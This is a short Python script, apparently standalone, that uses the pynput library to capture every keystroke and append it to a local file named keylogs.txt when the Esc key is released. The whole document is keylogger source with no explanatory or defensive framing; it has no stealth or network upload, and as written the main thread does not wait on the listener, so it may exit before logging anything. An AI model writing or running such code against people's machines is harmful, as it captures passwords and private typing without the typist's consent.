from pynput import keyboard
import os

keylogs = []

def on_press(key):
    try:
        keylogs.append(str(key.char))
    except AttributeError:
        keylogs.append('[' + str(key) + ']')

def on_release(key):
    if key == keyboard.Key.esc:
        with open('keylogs.txt', 'a') as f:
            f.write(''.join(keylogs))
        exit()

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()